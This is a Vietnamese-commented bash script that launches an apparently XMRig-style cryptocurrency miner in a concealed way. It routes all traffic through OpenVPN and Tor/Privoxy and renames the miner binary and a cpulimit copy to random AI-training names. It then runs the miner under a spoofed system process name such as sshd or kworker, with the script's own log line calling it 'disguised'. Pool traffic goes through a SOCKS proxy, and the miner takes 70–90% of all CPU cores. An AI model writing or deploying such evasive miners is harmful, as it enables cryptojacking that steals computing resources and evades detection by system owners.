#!/bin/bash

# Cấu hình DNS trước khi khởi động OpenVPN
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf

# Khởi động dịch vụ Tor, Privoxy và OpenVPN
sudo service tor restart
if ! pgrep -x "tor" > /dev/null; then
  echo "Tor service failed to start"
  exit 1
fi

sudo service privoxy restart
if ! pgrep -x "privoxy" > /dev/null; then
  echo "Privoxy service failed to start"
fi

# Khởi động OpenVPN và kiểm tra kết nối
sudo openvpn --config $VPN_CONFIG & 
sleep 5
if ! pgrep -x "openvpn" > /dev/null; then
  echo "OpenVPN service failed to start"
  exit 1
else
  echo "OpenVPN connected, adjusting routes..."
  # Xóa tuyến mặc định qua eth0
  ip route del default
  
  # Thêm tuyến mặc định qua tun0
  ip route add default via 10.8.0.1 dev tun0
  echo "Route updated: default via 10.8.0.1 dev tun0"
fi

sudo stunnel --config $STUNNEL &

# Tạo file model.txt nếu chưa tồn tại
if [ ! -f /root/model.txt ]; then
  touch /root/model.txt
fi

# Xóa tiến trình cũ nếu có
if [ -f /usr/sbin/$(cat /root/model.txt | cut -d ':' -f2) ]; then
  echo "Removing old process: $(cat /root/model.txt | cut -d ':' -f2)"
  rm -f /usr/sbin/$(cat /root/model.txt | cut -d ':' -f2)
fi

# Tạo tên tiến trình mới và cpulimit mới
SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")
RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}

RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
echo "$RANDOM_SYSTEM_PROCESS:$FINAL_NAME" > /root/model.txt

# Tạo bản sao tiến trình thực
cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME

# Xóa cpulimit cũ nếu tồn tại
if [ -f /usr/bin/$CPULIMIT_NAME ]; then
  echo "Removing old cpulimit: $CPULIMIT_NAME"
  rm -f /usr/bin/$CPULIMIT_NAME
fi

# Tạo tên mới cho cpulimit
CPULIMIT_NAME="${RANDOM_AI_NAME}_${RANDOM_NUMBER}"
cp /usr/bin/cpulimit /usr/bin/$CPULIMIT_NAME

# Cấu hình CPU và khởi chạy tiến trình với Wrapper Process
TOTAL_CORES=$(nproc)
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)
CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))
TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))
CPU_LIMIT_PERCENT=$(shuf -i 70-90 -n 1)
CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))

# Sử dụng Wrapper Process để bọc tiến trình
echo "Starting the process disguised as: $FINAL_NAME and cpulimit: $CPULIMIT_NAME (wrapped under the system process: $RANDOM_SYSTEM_PROCESS)"
sudo -u nobody bash -c "exec -a $RANDOM_SYSTEM_PROCESS /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:8118"

# Giữ tiến trình chạy
tail -f /dev/null
